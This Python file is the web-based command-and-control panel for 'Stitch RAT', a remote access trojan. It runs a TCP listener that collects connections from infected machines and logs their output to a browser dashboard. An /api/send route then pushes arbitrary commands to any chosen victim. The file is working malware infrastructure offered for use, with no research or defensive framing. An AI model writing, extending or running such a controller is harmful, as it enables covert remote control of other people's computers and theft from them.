#!/usr/bin/env python3
"""
Web-based Admin Panel for Stitch RAT
Run: python web_gui.py --key YOUR_ADMIN_KEY
"""

import sys
import os
import threading
import time
import json
import argparse
from datetime import datetime

# Add project root to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from flask import Flask, render_template, request, jsonify, Response
from flask_socketio import SocketIO, emit
from core.helpers import send_msg, recv_msg
from core.config import SERVER_PORT, ADMIN_KEY
import socket

app = Flask(__name__)
app.config['SECRET_KEY'] = 'stitch_rat_secret'
socketio = SocketIO(app, cors_allowed_origins="*")

# Global state
clients = {}          # sock -> (addr, client_id)
client_counter = 0
lock = threading.Lock()
server_socket = None
running = True
logs = []
selected_client_id = None

class WebAdminServer:
    def __init__(self, host='0.0.0.0', port=SERVER_PORT, key=ADMIN_KEY):
        self.host = host
        self.port = port
        self.key = key
        self.server_socket = None
        
    def start(self):
        global server_socket
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(15)
        server_socket = self.server_socket
        log_message(f"✅ RAT Server listening on {self.host}:{self.port}")
        threading.Thread(target=self.accept_clients, daemon=True).start()
        
    def accept_clients(self):
        while running:
            try:
                client_sock, addr = self.server_socket.accept()
                with lock:
                    global client_counter
                    client_counter += 1
                    client_id = client_counter
                    clients[client_sock] = (addr, client_id)
                log_message(f"✨ Client connected → ID: {client_id} | {addr[0]}:{addr[1]}")
                socketio.emit('clients_update', get_clients_list())
                threading.Thread(target=self.handle_client, args=(client_sock, addr, client_id), daemon=True).start()
            except:
                if running:
                    break
                    
    def handle_client(self, client_sock, addr, client_id):
        try:
            while running:
                data = recv_msg(client_sock)
                if data is None:
                    break
                if data == "ping":
                    send_msg(client_sock, "pong")
                    continue
                # Forward log to web UI
                log_message(f"[Client {client_id}] {data}")
                socketio.emit('client_log', {'client_id': client_id, 'log': data})
        except:
            pass
        finally:
            with lock:
                if client_sock in clients:
                    del clients[client_sock]
            log_message(f"⚠️ Client disconnected → ID: {client_id}")
            socketio.emit('clients_update', get_clients_list())
            try:
                client_sock.close()
            except:
                pass
                
    def send_command(self, client_id, command):
        with lock:
            for sock, (addr, cid) in clients.items():
                if cid == client_id:
                    try:
                        send_msg(sock, command)
                        return True, f"Command sent: {command}"
                    except Exception as e:
                        return False, str(e)
        return False, "Client not found"

def get_clients_list():
    with lock:
        return [{'id': cid, 'addr': addr[0], 'port': addr[1]} for sock, (addr, cid) in clients.items()]

def log_message(msg):
    timestamp = datetime.now().strftime('%H:%M:%S')
    formatted = f"[{timestamp}] {msg}"
    logs.append(formatted)
    if len(logs) > 500:
        logs.pop(0)
    print(formatted)

# Flask routes
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/clients')
def api_clients():
    return jsonify(get_clients_list())

@app.route('/api/logs')
def api_logs():
    return jsonify(logs[-100:])

@app.route('/api/select', methods=['POST'])
def api_select():
    global selected_client_id
    data = request.json
    selected_client_id = data.get('client_id')
    return jsonify({'status': 'ok', 'selected': selected_client_id})

@app.route('/api/send', methods=['POST'])
def api_send():
    data = request.json
    client_id = data.get('client_id')
    command = data.get('command')
    if not client_id or not command:
        return jsonify({'error': 'Missing client_id or command'}), 400
    success, msg = server.send_command(client_id, command)
    return jsonify({'success': success, 'message': msg})

@socketio.on('connect')
def handle_connect():
    emit('clients_update', get_clients_list())
    emit('log_history', logs[-100:])

# Global server instance
server = None

def main():
    parser = argparse.ArgumentParser(description='Stitch RAT Web Admin Panel')
    parser.add_argument('--key', '-key', help='Admin key (must match config.py)', default=ADMIN_KEY)
    parser.add_argument('--port', '-p', type=int, default=5000, help='Web GUI port (default 5000)')
    parser.add_argument('--bind', '-b', default='0.0.0.0', help='Web GUI bind address')
    args = parser.parse_args()
    
    if args.key != ADMIN_KEY:
        print("Invalid admin key.")
        sys.exit(1)
        
    global server
    server = WebAdminServer(host='0.0.0.0', port=SERVER_PORT, key=args.key)
    server.start()
    
    print(f"🌐 Web GUI starting on http://{args.bind}:{args.port}")
    socketio.run(app, host=args.bind, port=args.port, debug=False, use_reloader=False)

if __name__ == '__main__':
    main()
